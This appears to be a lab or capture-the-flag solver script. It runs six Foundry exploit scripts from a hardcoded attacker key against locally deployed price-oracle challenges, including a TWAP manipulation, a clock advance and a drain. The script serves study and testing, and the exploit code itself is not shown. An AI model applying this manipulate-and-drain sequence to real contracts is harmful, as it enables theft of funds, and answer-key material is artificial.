#!/usr/bin/env bash
# Runs all six oracle exploits against the deployed challenges (as the attacker,
# anvil account[1]). Reads Setup addresses from /shared/addrs.env. Challenge 3
# (TWAP) needs the chain clock advanced past the averaging window, done here
# with anvil's evm_increaseTime between the manipulation and the drain.
set -u
RPC=${RPC_URL:-http://chain:8545}
PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d   # attacker

# shellcheck disable=SC1091
source /shared/addrs.env

fscript() {  # name setup
  SETUP="$2" forge script "script/solve/$1.s.sol:$1" \
    --rpc-url "$RPC" --private-key "$PK" --broadcast
}

run() {  # name setup
  echo "── $1  ($2)"
  if fscript "$1" "$2" >"/tmp/$1.log" 2>&1; then
    echo "   exploit broadcast"
  else
    echo "   FAILED:"; tail -8 "/tmp/$1.log" | sed 's/^/     /'
  fi
}

run SolveC1 "$C1_SETUP"
run SolveC2 "$C2_SETUP"

# C3 (TWAP): checkpoint + manipulate, advance the clock past the window, drain.
echo "── SolveC3  ($C3_SETUP)  [TWAP: manipulate → +time → drain]"
{
  fscript SolveC3a "$C3_SETUP" \
    && cast rpc --rpc-url "$RPC" evm_increaseTime 700 >/dev/null \
    && cast rpc --rpc-url "$RPC" evm_mine >/dev/null \
    && fscript SolveC3b "$C3_SETUP" \
    && echo "   exploit broadcast" \
    || echo "   FAILED (see /tmp/SolveC3*.log)"
} >"/tmp/SolveC3.log" 2>&1
tail -2 /tmp/SolveC3.log | sed 's/^/   /'

run SolveC4 "$C4_SETUP"
run SolveC5 "$C5_SETUP"
run SolveC6 "$C6_SETUP"
echo "── all exploits attempted"
